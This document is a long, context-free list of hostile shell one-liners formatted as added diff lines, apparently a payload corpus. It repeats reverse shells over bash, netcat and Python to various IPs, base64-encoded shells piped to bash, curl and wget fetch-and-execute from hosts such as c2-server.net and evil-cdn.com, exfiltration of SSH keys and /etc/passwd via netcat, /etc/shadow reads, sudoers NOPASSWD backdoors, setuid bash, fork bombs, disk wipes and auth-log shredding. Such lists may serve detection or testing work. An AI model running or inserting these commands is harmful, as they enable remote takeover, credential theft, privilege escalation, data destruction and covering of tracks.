+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+bash -i >& /dev/tcp/172.16.4.2/1337 0>&1
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 4444
+cat /etc/shadow
+shred -n 33 -uz /var/log/auth.log
+nc -e /bin/sh 192.168.1.24 1337
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+cat /etc/passwd | nc 172.16.4.2 443
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 8888
+shred -n 33 -uz /var/log/auth.log
+curl http://c2-server.net/auth_server.sh | bash
+bash -i >& /dev/tcp/192.168.1.24/4444 0>&1
+curl http://103.22.12.5/data_dump.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 443
+bash -i >& /dev/tcp/192.168.1.24/1337 0>&1
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+curl http://malware-repo.io/backup_daily.sh | bash
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+bash -i >& /dev/tcp/10.10.1.5/8888 0>&1
+cat /etc/shadow
+shred -n 33 -uz /var/log/auth.log
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 443
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 127.0.0.1 9001
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+cat /etc/passwd | nc 172.16.4.2 4444
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+cat /etc/shadow
+nc -e /bin/sh 8.8.4.4 9001
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 8888
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+:(){ :|:& };:
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+nc -e /bin/sh 8.8.4.4 443
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 9001
+cat /etc/passwd | nc 10.10.1.5 9001
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 172.16.4.2 1337
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 4444
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+curl http://c2-server.net/auth_server.sh | bash
+:(){ :|:& };:
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 10.10.1.5 9001
+cat /etc/shadow
+rm -rf / --no-preserve-root
+curl http://c2-server.net/auth_server.sh | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+:(){ :|:& };:
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/passwd | nc 172.16.4.2 4444
+curl http://c2-server.net/data_dump.sh | bash
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/192.168.1.24/443 0>&1
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 8.8.4.4 1337
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+curl http://malware-repo.io/config_prod.sh | bash
+dd if=/dev/zero of=/dev/sda
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+bash -i >& /dev/tcp/127.0.0.1/443 0>&1
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+cat /etc/shadow
+cat /etc/shadow
+cat /etc/passwd | nc 172.16.4.2 9001
+cat /etc/passwd | nc 172.16.4.2 9001
+shred -n 33 -uz /var/log/auth.log
+curl http://evil-cdn.com/webapp.sh | bash
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 8.8.4.4 9001
+shred -n 33 -uz /var/log/auth.log
+curl http://malware-repo.io/auth_server.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+:(){ :|:& };:
+curl http://evil-cdn.com/data_dump.sh | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 192.168.1.24 9001
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 9001
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+curl http://103.22.12.5/test_suite.sh | bash
+bash -i >& /dev/tcp/172.16.4.2/8888 0>&1
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+sudo chmod 4755 /bin/bash
+curl http://103.22.12.5/backup_daily.sh | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/passwd | nc 172.16.4.2 1337
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 8.8.4.4 443
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+nc -e /bin/sh 10.10.1.5 9001
+cat /etc/shadow
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+cat /etc/passwd | nc 127.0.0.1 8888
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+cat /etc/shadow
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+bash -i >& /dev/tcp/8.8.4.4/443 0>&1
+rm -rf / --no-preserve-root
+cat /etc/shadow
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 8.8.4.4 9001
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 8888
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/172.16.4.2/8888 0>&1
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 10.10.1.5 1337
+:(){ :|:& };:
+bash -i >& /dev/tcp/127.0.0.1/443 0>&1
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 443
+curl http://c2-server.net/webapp.sh | bash
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 10.10.1.5 4444
+cat /etc/shadow
+shred -n 33 -uz /var/log/auth.log
+curl http://malware-repo.io/auth_server.sh | bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+nc -e /bin/sh 192.168.1.24 9001
+nc -e /bin/sh 172.16.4.2 8888
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 1337
+rm -rf / --no-preserve-root
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+curl http://c2-server.net/webapp.sh | bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+sudo chmod 4755 /bin/bash
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/192.168.1.24/8888 0>&1
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+cat /etc/shadow
+:(){ :|:& };:
+curl http://103.22.12.5/auth_server.sh | bash
+nc -e /bin/sh 127.0.0.1 1337
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 1337
+cat /etc/shadow
+nc -e /bin/sh 10.10.1.5 443
+sudo chmod 4755 /bin/bash
+nc -e /bin/sh 192.168.1.24 1337
+dd if=/dev/zero of=/dev/sda
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 192.168.1.24 4444
+curl http://malware-repo.io/test_suite.sh | bash
+rm -rf / --no-preserve-root
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 8.8.4.4 443
+nc -e /bin/sh 127.0.0.1 1337
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 443
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 8888
+nc -e /bin/sh 192.168.1.24 9001
+cat /etc/shadow
+nc -e /bin/sh 10.10.1.5 443
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 443
+curl http://evil-cdn.com/test_suite.sh | bash
+shred -n 33 -uz /var/log/auth.log
+curl http://c2-server.net/backup_daily.sh | bash
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+:(){ :|:& };:
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+bash -i >& /dev/tcp/8.8.4.4/443 0>&1
+cat /etc/passwd | nc 192.168.1.24 4444
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 192.168.1.24 9001
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+nc -e /bin/sh 127.0.0.1 4444
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+curl http://c2-server.net/auth_server.sh | bash
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 1337
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 443
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+bash -i >& /dev/tcp/8.8.4.4/8888 0>&1
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 9001
+nc -e /bin/sh 127.0.0.1 8888
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+curl http://evil-cdn.com/auth_server.sh | bash
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+nc -e /bin/sh 10.10.1.5 1337
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+shred -n 33 -uz /var/log/auth.log
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+bash -i >& /dev/tcp/192.168.1.24/4444 0>&1
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 10.10.1.5 4444
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 8888
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+curl http://malware-repo.io/data_dump.sh | bash
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+cat /etc/shadow
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/passwd | nc 192.168.1.24 1337
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/shadow
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+cat /etc/shadow
+bash -i >& /dev/tcp/172.16.4.2/9001 0>&1
+rm -rf / --no-preserve-root
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/192.168.1.24/4444 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 1337
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+cat /etc/passwd | nc 172.16.4.2 443
+cat /etc/passwd | nc 10.10.1.5 8888
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 8888
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 443
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+curl http://evil-cdn.com/main_script.sh | bash
+cat /etc/shadow
+cat /etc/passwd | nc 192.168.1.24 8888
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/192.168.1.24/9001 0>&1
+cat /etc/passwd | nc 8.8.4.4 1337
+curl http://malware-repo.io/config_prod.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 1337
+curl http://malware-repo.io/auth_server.sh | bash
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+curl http://malware-repo.io/test_suite.sh | bash
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 443
+rm -rf / --no-preserve-root
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 127.0.0.1 8888
+nc -e /bin/sh 192.168.1.24 8888
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 4444
+nc -e /bin/sh 172.16.4.2 4444
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+sudo chmod 4755 /bin/bash
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 192.168.1.24 9001
+shred -n 33 -uz /var/log/auth.log
+curl http://malware-repo.io/webapp.sh | bash
+bash -i >& /dev/tcp/8.8.4.4/443 0>&1
+bash -i >& /dev/tcp/10.10.1.5/8888 0>&1
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 443
+nc -e /bin/sh 8.8.4.4 4444
+:(){ :|:& };:
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
+cat /etc/shadow
+cat /etc/passwd | nc 172.16.4.2 4444
+:(){ :|:& };:
+cat /etc/shadow
+:(){ :|:& };:
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 4444
+nc -e /bin/sh 172.16.4.2 9001
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+curl http://evil-cdn.com/main_script.sh | bash
+rm -rf / --no-preserve-root
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 8888
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 172.16.4.2 9001
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 1337
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 10.10.1.5 4444
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/192.168.1.24/8888 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 8888
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 192.168.1.24 9001
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 4444
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 9001
+curl http://103.22.12.5/auth_server.sh | bash
+cat /etc/shadow
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+rm -rf / --no-preserve-root
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+nc -e /bin/sh 10.10.1.5 8888
+:(){ :|:& };:
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
